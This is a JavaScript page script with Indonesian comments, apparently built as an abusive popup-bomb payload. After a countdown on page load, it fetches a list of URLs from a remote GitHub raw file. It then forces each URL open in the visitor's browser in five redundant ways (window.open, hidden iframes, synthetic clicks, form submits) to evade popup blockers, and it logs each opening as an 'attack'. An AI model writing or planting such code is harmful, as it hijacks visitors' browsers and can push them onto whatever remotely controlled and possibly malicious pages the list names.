<script type="text/javascript">
// ============================================
// ANTI BLOKIR POPUP - METODE BRUTAL
// ============================================

let urlList = [];
let timer = 5;
let opened = 0;

function fetchUrls() {
    fetch('https://raw.githubusercontent.com/QyaoXploit67/QyaoXploit67/refs/heads/main/10.txt')
        .then(response => response.text())
        .then(data => {
            const lines = data.split('\n');
            urlList = [];
            lines.forEach(line => {
                const match = line.match(/https?:\/\/[^\s]+/);
                if (match) {
                    urlList.push(match[0]);
                }
            });
            console.log('[+] URL ditemukan:', urlList);
            openAllTabsBrutal();
        })
        .catch(err => {
            console.log('[-] Gagal ambil 10.txt:', err);
        });
}

// ============================================
// METODE BRUTAL: 5 CARA SEKALIGUS
// ============================================
function openAllTabsBrutal() {
    urlList.forEach((url, index) => {
        setTimeout(() => {
            // METHOD 1: window.open
            let win = window.open(url, '_blank');
            
            // METHOD 2: Kalo gagal, pake iframe
            if (!win || win.closed) {
                const iframe = document.createElement('iframe');
                iframe.src = url;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                setTimeout(() => document.body.removeChild(iframe), 3000);
            }
            
            // METHOD 3: Pake link click (event native)
            const a = document.createElement('a');
            a.href = url;
            a.target = '_blank';
            a.rel = 'noopener noreferrer';
            a.style.display = 'none';
            document.body.appendChild(a);
            
            // Pake dispatch event biar lebih "natural"
            const event = new MouseEvent('click', {
                view: window,
                bubbles: true,
                cancelable: true
            });
            a.dispatchEvent(event);
            
            // METHOD 4: Fallback pake click() biasa
            setTimeout(() => {
                a.click();
                document.body.removeChild(a);
            }, 100);
            
            // METHOD 5: Pake form submit (last resort)
            setTimeout(() => {
                const form = document.createElement('form');
                form.action = url;
                form.target = '_blank';
                form.method = 'GET';
                document.body.appendChild(form);
                form.submit();
                document.body.removeChild(form);
            }, 200);
            
            opened++;
            console.log('[+] SERANGAN #' + opened + ' ke: ' + url);
        }, index * 100);
    });
}

function startTimer() {
    const timerElement = document.getElementById('timerDisplay');
    const interval = setInterval(() => {
        timer--;
        timerElement.textContent = timer;
        if (timer <= 0) {
            clearInterval(interval);
            timerElement.textContent = 'GO!';
            fetchUrls();
            setTimeout(() => {
                timerElement.style.display = 'none';
            }, 1000);
        }
    }, 1000);
}

window.onload = function() {
    startTimer();
};

</script>
